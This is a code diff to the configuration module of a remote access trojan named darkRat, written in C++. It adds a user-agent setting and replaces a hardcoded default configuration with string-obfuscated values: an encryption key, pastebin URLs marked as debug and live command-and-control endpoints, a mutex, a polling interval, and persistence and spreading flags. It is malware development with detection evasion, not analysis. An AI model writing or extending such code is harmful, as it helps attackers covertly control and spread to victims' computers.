@@ -33,6 +33,7 @@ namespace darkRat
 			std::string requestInterval;
 			std::string persistence;
 			std::string spreadtag;
+			std::string useragent;
 
 			std::string type = "Full";
 			std::string versionID = "2.1.1";
@@ -40,7 +41,7 @@ namespace darkRat
 			std::string encryptionKey;
 
 
-			config(std::string ek, std::string pu, std::string mux, std::string sup, std::string ri, std::string per, std::string st, std::list<std::string> pn)
+			config(std::string ek, std::string pu, std::string mux, std::string sup, std::string ri, std::string per, std::string st, std::string ua, std::list<std::string> pn)
 			{
 				encryptionKey = ek;
 				pastebinUrl = pu;
@@ -48,6 +49,7 @@ namespace darkRat
 				mutex = mux;
 				spreadtag = st;
 				startup = sup;
+				useragent = ua;
 				requestInterval = ri;
 			}
 		};
@@ -76,14 +78,24 @@ namespace darkRat
 				std::string ri = j_config["ri"];
 				std::string pre = j_config["pre"];
 				std::string spreadtag = j_config["st"];
+				std::string useragent = j_config["ua"];
 				std::list<std::string> pn = j_config["pn"];
 
-				return config(ek, pu, mux, sup, ri, pre, spreadtag, pn);
+				return config(ek, pu, mux, sup, ri, pre, spreadtag, useragent, pn);
 			}
-			
 
-			return config("S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>", "http://gist.githubusercontent.com/darkspiderbots/966601ef8a8cf5257a515b3ee705c93f/raw/2199f0703f3625ac61e12aa0c7115db0342bb4a7/test", "mutextest", "false", "390", "false", "spreadtag",{});
-	
+			return config(OBFUSCATE("S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>"),
+				OBFUSCATE("http://pastebin.com/raw/wJJPteV2"), //Debug
+				//OBFUSCATE("http://pastebin.com/raw/Qq0sfw23"),  //Live
+				OBFUSCATE("3mCUq1z"),
+				OBFUSCATE("false"),
+				OBFUSCATE("5"),
+				OBFUSCATE("false"),
+				OBFUSCATE("main"),
+				OBFUSCATE("SUq1rx"),
+				{}
+			);
+
 		}
 	}
 }
